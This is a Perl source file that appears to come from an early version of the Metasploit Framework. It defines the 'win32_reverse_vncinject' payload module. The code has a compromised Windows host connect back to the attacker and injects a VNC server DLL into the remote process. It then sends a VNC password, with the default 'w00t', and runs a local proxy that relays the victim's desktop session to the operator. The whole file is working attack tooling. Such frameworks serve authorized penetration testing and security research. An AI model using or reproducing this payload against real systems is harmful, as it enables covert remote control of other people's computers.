package Msf::Payload::win32_reverse_vncinject;
use strict;
use base 'Msf::PayloadComponent::Win32InjectLibStage';
sub load {
  Msf::PayloadComponent::Win32InjectLibStage->import('Msf::PayloadComponent::Win32ReverseStager');
}

my $info =
{
  'Name'         => 'winreverse_vncinject',
  'Version'      => '$Revision$',
  'Description'  => 'Connect back and inject a VNC server into the remote process',
  'Authors'      => [
                        'Matt Miller <mmiller@hick.org> [Unknown License]',
                        'Jarkko Turkulainen <jt@klake.org> [Unknown License]',
                    ],
  'UserOpts'     => { 
                        'DLL'     => [1, 'PATH', 'The full path the VNC service dll'],
                        'VNCPASS' => [1, 'DATA', 'The password to use with the VNC service', 'w00t'],
                        'VNCPORT' => [1, 'PORT', 'The local port to use for the VNC proxy',  0],
                    },
                
};

sub new {
  load();
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHash($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);
  return($self);
}

sub _InjectDLL {
  my $self = shift;
  return $self->GetVar('DLL');
}


sub HandleConnection {
  my $self = shift;
  my $sock = $self->SocketOut;
  $self->SUPER::HandleConnection;
  sleep(1);

  my $pass = substr($self->GetVar('VNCPASS'), 0, 8);
  $pass   .= "\x00" x (8-length($pass));

  $self->PrintLine('[*] Sending password to VNC service');
  $sock->send($pass);
  
  # Create listener socket
  my $lis = IO::Socket::INET->new(
    'Proto'     => 'tcp',
    'ReuseAddr' => 1,
    'Listen'    => 5,
    'Blocking'  => 0,
    'LocalPort' => $self->GetVar('VNCPORT'),
  );  
  
  if (! $lis) {
    $self->PrintLine("[*] Problem creating the VNC proxy listener: $@");
    $self->KillChild;    
    return;  
  }
  
  $self->PrintLine('[*] VNC proxy listening on port '.$lis->sockport.'...');
  
  # Accept connection from user
  my $sel = IO::Select->new($lis);
  my $clock = time();
  my $mwait = 300;
  my $csock;
  
  while (! $csock && time < ($clock+$mwait))
  {
    foreach ($sel->can_read(0.25)) { $csock = $lis->accept() }
  }
  
  if (! $csock) {
    $self->PrintLine('[*] VNC proxy did not recieve connection before timeout');
    $self->KillChild;    
    return;
  } 
  
  $self->PrintLine('[*] VNC proxy started with password '.$self->GetVar('VNCPASS').'...');
  $self->VNCProxy($sock, $csock);
  $self->PrintLine('[*] VNC proxy finished');
  $self->KillChild;    
  return;
}

sub VNCProxy {
  my $self = shift;
  my $srv = shift;
  my $cli = shift;

  foreach ($srv, $cli) {
    $_->blocking(1);
    $_->autoflush(1);
  }

  my $selector = IO::Select->new($srv, $cli);

  LOOPER:
    while(1) {
      my @ready = $selector->can_read;
      foreach my $ready (@ready) {
        if($ready == $cli) {
          my $data;
          $cli->recv($data, 8192);
          last LOOPER if (! length($data));     
          last LOOPER if(!$srv || !$srv->connected);
          $srv->send($data);
        }
        elsif($ready == $srv) {
          my $data;
          $srv->recv($data, 8192);
          last LOOPER if(!length($data));
          last LOOPER if(!$cli || !$cli->connected);
          $cli->send($data);
        }
      }
    }
}

1;
